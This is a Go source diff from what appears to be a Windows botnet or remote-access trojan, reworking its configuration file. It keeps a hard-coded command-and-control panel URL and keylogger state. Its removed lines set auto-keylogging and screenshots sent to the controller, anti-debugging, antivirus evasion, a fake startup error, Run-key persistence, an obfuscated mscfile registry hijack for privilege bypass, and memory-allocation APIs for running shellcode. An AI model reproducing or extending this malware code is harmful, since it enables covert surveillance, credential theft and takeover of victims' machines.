@@ -6,7 +6,7 @@ package components
 
 import (
 	"os"
-	"syscall"
+	"strings"
 
 	"github.com/MShoaei/w32"
 )
@@ -21,14 +21,8 @@ var (
 	//============================================================
 	httpPanels = [...]string{"https://server4331-mshoaei.fandogh.cloud/"} //HTTP C&C Addresses
 	// httpPanels            = [...]string{"http://localhost:9990/"}  //HTTP C&C Addresses
-	useSSL                = false                                  //Use SSL Connections? Make sure the Panel URLS are https://
-	sslInsecureSkipVerify = true                                   //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
-	userAgentKey          = "d5900619da0c8a72e569e88027cd9490"     //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
-	checkEveryMin         = 15                                     //Min Time (Seconds) to check for commands
-	checkEveryMax         = 25                                     //Max Time (Seconds) to check for commands (Must be more then Min)
-	instanceKey           = "80202e73-067f-4b4c-93f8-d738d1f77f69" //Bots Uniqe ID, Generate here; https://www.guidgen.com/
-	installMe             = true                                   //Should the bot install into system?
-	installNames          = [...]string{                           //Names for the Bot
+	instanceKey  = "80202e73-067f-4b4c-93f8-d738d1f77f69" //Bots Uniqe ID, Generate here; https://www.guidgen.com/
+	installNames = [...]string{                           //Names for the Bot
 		// "svchost",
 		// "csrss",
 		// "rundll32",
@@ -67,32 +61,9 @@ var (
 	//============================================================
 	//                   Optional Variables
 	//============================================================
-	clientVersion          = "ArchDuke"                                                                                         //Bot Version
-	autofirwall            = true                                                                                               //If has Admin on install will automaticly add bot to Windows Firewall
-	campaignMode           = false                                                                                              //Only install in stated regions
-	antiDebug              = false                                                                                              //Anti-Debug Programs
-	debugReaction          = 1                                                                                                  // How to react to debug programs, 0 = Self Delete, 1 = Exit, 2 = Loop doing nothing
-	activeDefense          = false                                                                                              //Use Active defense
-	watchdogName           = "activedefense"                                                                                    //Name of the WatchDog program
-	antiProcess            = false                                                                                              //Run Anti-Process on run
-	autoScreenShot         = true                                                                                               //Auto send a new Screen Shot to C&C
-	autoScreenShotInterval = 15                                                                                                 //Minutes to wait between each SS
-	sleepOnRun             = false                                                                                              //Enable to sleep before loading config/starting
-	sleepOnRunTime         = 5                                                                                                  //Seconds to sleep before starting (helps bypass AV)
-	editHosts              = false                                                                                              //Edit the HOST file on lounch to preset settings
-	antiVirusBypass        = false                                                                                              //Helps hide from Anti-Virus Programs
-	procBlacklist          = false                                                                                              //Process names to exit if detected
-	autoKeylogger          = true                                                                                               //Run keylogger automaticly on bot startup
-	autoKeyloggerInterval  = 5                                                                                                  //Minutes to wait to send keylogs to C&C
-	autoReverseProxy       = false                                                                                              //To run the Reverse Proxy Server on startup
-	reverseProxyPort       = "8080"                                                                                             //Normal Port to run the server on
-	reverseProxyBackend    = "127.0.0.1:6060"                                                                                   //Backends to send proxyed data too. Supports Multi (127.0.0.1:8080,127.0.0.1:8181,....)
-	startUpError           = false                                                                                              //Shows an Error message on startup
-	startUpErrorTitle      = "Error"                                                                                            //Title of Error Message
-	startUpErrorText       = "This Programm is not a valid Win32 Application!"                                                  //Text of Error Message
-	checkIP                = [...]string{"http://checkip.amazonaws.com", "http://myip.dnsdynamic.org", "http://ip.dnsexit.com"} //$_SERVER['REMOTE_ADDR']
-	maxMind                = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
-	uTorrnetURL            = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
+	checkIP     = [...]string{"http://checkip.amazonaws.com", "http://myip.dnsdynamic.org", "http://ip.dnsexit.com"} //$_SERVER['REMOTE_ADDR']
+	maxMind     = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
+	uTorrnetURL = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
 	//	xmrMinerURL          string = "https://ottrbutt.com/cpuminer-multi/minerd-wolf-07-09-14.exe"                                                                 //URL to the Miner.exe
 	tmpPath     = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
 	winDirPath  = os.Getenv("WINDIR") + "\\"  //Windows
@@ -277,55 +248,14 @@ var (
 		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)",
 	}
 
-	//============================================================
-	//                   Dont Touch Bellow
-	//============================================================
-
-	runPath            = deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo")             //Software\Microsoft\Windows\CurrentVersion\Run
-	homepagePath       = deobfuscate("Tpguxbsf]]Njdsptpgu]]Joufsofu!Fyqmpsfs]]Nbjo")              //Software\Microsoft\Internet Explorer\Main
-	systemPoliciesPath = deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Qpmjdjft]Tztufn") //Software\Microsoft\Windows\CurrentVersion\Policies\System
-
-	bypassPath    = deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf]]tifmm]]pqfo]]dpnnboe") //HKCU\Software\Classes\mscfile\shell\open\command
-	bypassPathAlt = deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf")                       //HKCU\Software\Classes\mscfile
-
-	hostFilePath = deobfuscate("Tztufn43]]esjwfst]]fud]]") //system32/drivers/etc/
-
-	user32   = syscall.NewLazyDLL(deobfuscate("vtfs43/emm"))   //user32.dll
-	kernel32 = syscall.NewLazyDLL(deobfuscate("lfsofm43/emm")) //kernel32.dll
-
-	procMessageBoxW = user32.NewProc(deobfuscate("NfttbhfCpyX")) //MessageBoxW
-
-	procGetAsyncKeyState = user32.NewProc(deobfuscate("HfuBtzodLfzTubuf")) //GetAsyncKeyState
-
-	procCreateMutex = kernel32.NewProc(deobfuscate("DsfbufNvufyX")) //CreateMutexW
-
-	procIsDebuggerPresent = kernel32.NewProc(deobfuscate("JtEfcvhhfsQsftfou")) //IsDebuggerPresent
-
-	procGetForegroundWindow = user32.NewProc(deobfuscate("HfuGpsfhspvoeXjoepx")) //GetForegroundWindow
-	procGetWindowTextW      = user32.NewProc(deobfuscate("HfuXjoepxUfyuX"))      //GetWindowTextW
-	procShowWindow          = user32.NewProc(deobfuscate("TipxXjoepx"))          //ShowWindow
-	procEnumWindows         = user32.NewProc(deobfuscate("FovnXjoepxt"))         //EnumWindows
-
-	procSystemParametersInfoW = user32.NewProc(deobfuscate("TztufnQbsbnfufstJogpX")) //SystemParametersInfoW
-
-	procVirtualAlloc        = kernel32.NewProc(deobfuscate("WjsuvbmBmmpd"))        //VirtualAlloc
-	procRtlMoveMemory       = kernel32.NewProc(deobfuscate("SumNpwfNfnpsz"))       //RtlMoveMemory
-	procCreateThread        = kernel32.NewProc(deobfuscate("DsfbufUisfbe"))        //CreateThread
-	procWaitForSingleObject = kernel32.NewProc(deobfuscate("XbjuGpsTjohmfPckfdu")) //WaitForSingleObject
-
-	isAdmin        = false
-	isDDoS         = false
-	isKeyLogging   = false
-	isHosting      = false
-	isAVKilling    = false
-	isAntiProc     = false
-	singleInstance = true //Check to see if this bots already running
+	ch   = make(chan struct{})
+	quit = make(chan struct{})
 
 	//Tmp Values
 	myUID          string
 	lastCommand    string
 	didlastCommand bool
-	tmpKeylog      string
+	tmpKeylog      strings.Builder
 	tmpTitle       string
 	caps           bool
 	shift          bool
@@ -334,192 +264,6 @@ var (
 	myInstallReg   string
 	dogTreat       int
 	keyboardHook   w32.HHOOK
+	gHook          w32.HWINEVENTHOOK
 )
 
-// Useful and USELESS constants
-const (
-	MBOk                = 0x00000000
-	MBOkCancel          = 0x00000001
-	MBAbortRetryIgnore  = 0x00000002
-	MBYesNoCancel       = 0x00000003
-	MBYesNo             = 0x00000004
-	MBRetryCancel       = 0x00000005
-	MBCancelTryContinue = 0x00000006
-	MBIconHand          = 0x00000010
-	MBIconQuestion      = 0x00000020
-	MBIconExclamation   = 0x00000030
-	MBIconAsterisk      = 0x00000040
-	MBUserIcon          = 0x00000080
-	MBIconWarning       = MBIconExclamation
-	MBIconError         = MBIconHand
-	MBIconInformation   = MBIconAsterisk
-	MBIconStop          = MBIconHand
-
-	MBDefaultButton1 = 0x00000000
-	MBDefaultButton2 = 0x00000100
-	MBDefaultButton3 = 0x00000200
-	MBDefaultButton4 = 0x00000300
-
-	ErrorAlreadyExists = 183
-
-	MEMCommit  = 0x1000
-	MEMReserve = 0x2000
-
-	PageExecuteReadWrite = 0x40
-
-	// Virtual-Key Codes
-	vkBACK      = 0x08
-	vkTAB       = 0x09
-	vkCLEAR     = 0x0C
-	vkRETURN    = 0x0D
-	vkSHIFT     = 0x10
-	vkCONTROL   = 0x11
-	vkMENU      = 0x12
-	vkPAUSE     = 0x13
-	vkCAPITAL   = 0x14
-	vkESCAPE    = 0x1B
-	vkSPACE     = 0x20
-	vkPRIOR     = 0x21
-	vkNEXT      = 0x22
-	vkEND       = 0x23
-	vkHOME      = 0x24
-	vkLEFT      = 0x25
-	vkUP        = 0x26
-	vkRIGHT     = 0x27
-	vkDOWN      = 0x28
-	vkSELECT    = 0x29
-	vkPRINT     = 0x2A
-	vkEXECUTE   = 0x2B
-	vkSNAPSHOT  = 0x2C
-	vkINSERT    = 0x2D
-	vkDELETE    = 0x2E
-	vkLWIN      = 0x5B
-	vkRWIN      = 0x5C
-	vkAPPS      = 0x5D
-	vkSLEEP     = 0x5F
-	vkNUMPAD0   = 0x60
-	vkNUMPAD1   = 0x61
-	vkNUMPAD2   = 0x62
-	vkNUMPAD3   = 0x63
-	vkNUMPAD4   = 0x64
-	vkNUMPAD5   = 0x65
-	vkNUMPAD6   = 0x66
-	vkNUMPAD7   = 0x67
-	vkNUMPAD8   = 0x68
-	vkNUMPAD9   = 0x69
-	vkMULTIPLY  = 0x6A
-	vkADD       = 0x6B
-	vkSEPARATOR = 0x6C
-	vkSUBTRACT  = 0x6D
-	vkDECIMAL   = 0x6E
-	vkDIVIDE    = 0x6F
-	vkF1        = 0x70
-	vkF2        = 0x71
-	vkF3        = 0x72
-	vkF4        = 0x73
-	vkF5        = 0x74
-	vkF6        = 0x75
-	vkF7        = 0x76
-	vkF8        = 0x77
-	vkF9        = 0x78
-	vkF10       = 0x79
-	vkF11       = 0x7A
-	vkF12       = 0x7B
-	vkNUMLOCK   = 0x90
-	vkSCROLL    = 0x91
-	vkLSHIFT    = 0xA0
-	vkRSHIFT    = 0xA1
-	vkLCONTROL  = 0xA2
-	vkRCONTROL  = 0xA3
-	vkLMENU     = 0xA4
-	vkRMENU     = 0xA5
-	vkOEM1      = 0xBA
-	vkOEMPLUS   = 0xBB
-	vkOEMCOMMA  = 0xBC
-	vkOEMMINUS  = 0xBD
-	vkOEMPERIOD = 0xBE
-	vkOEM2      = 0xBF
-	vkOEM3      = 0xC0
-	vkOEM4      = 0xDB
-	vkOEM5      = 0xDC
-	vkOEM6      = 0xDD
-	vkOEM7      = 0xDE
-	vkOEM8      = 0xDF
-)
-
-type mMind struct {
-	City struct {
-		GeonameID int `json:"geoname_id"`
-		Names     struct {
-			En string `json:"en"`
-			Ru string `json:"ru"`
-		} `json:"names"`
-	} `json:"city"`
-	Continent struct {
-		Code      string `json:"code"`
-		GeonameID int    `json:"geoname_id"`
-		Names     struct {
-			Ja   string `json:"ja"`
-			PtBR string `json:"pt-BR"`
-			Ru   string `json:"ru"`
-			ZhCN string `json:"zh-CN"`
-			De   string `json:"de"`
-			En   string `json:"en"`
-			Es   string `json:"es"`
-			Fr   string `json:"fr"`
-		} `json:"names"`
-	} `json:"continent"`
-	Country struct {
-		IsoCode   string `json:"iso_code"`
-		GeonameID int    `json:"geoname_id"`
-		Names     struct {
-			ZhCN string `json:"zh-CN"`
-			De   string `json:"de"`
-			En   string `json:"en"`
-			Es   string `json:"es"`
-			Fr   string `json:"fr"`
-			Ja   string `json:"ja"`
-			PtBR string `json:"pt-BR"`
-			Ru   string `json:"ru"`
-		} `json:"names"`
-	} `json:"country"`
-	Location struct {
-		AccuracyRadius int     `json:"accuracy_radius"`
-		Latitude       float64 `json:"latitude"`
-		Longitude      float64 `json:"longitude"`
-		MetroCode      int     `json:"metro_code"`
-		TimeZone       string  `json:"time_zone"`
-	} `json:"location"`
-	Postal struct {
-		Code string `json:"code"`
-	} `json:"postal"`
-	Subdivisions []struct {
-		IsoCode   string `json:"iso_code"`
-		GeonameID int    `json:"geoname_id"`
-		Names     struct {
-			En   string `json:"en"`
-			Es   string `json:"es"`
-			Fr   string `json:"fr"`
-			Ja   string `json:"ja"`
-			PtBR string `json:"pt-BR"`
-			Ru   string `json:"ru"`
-			ZhCN string `json:"zh-CN"`
-			De   string `json:"de"`
-		} `json:"names"`
-	} `json:"subdivisions"`
-	Traits struct {
-		AutonomousSystemNumber       int    `json:"autonomous_system_number"`
-		AutonomousSystemOrganization string `json:"autonomous_system_organization"`
-		Isp                          string `json:"isp"`
-		Organization                 string `json:"organization"`
-		IPAddress                    string `json:"ip_address"`
-	} `json:"traits"`
-}
-
-type win32Process struct {
-	Name           string
-	ExecutablePath *string
-}
-type win32Product struct {
-	Name *string
-}
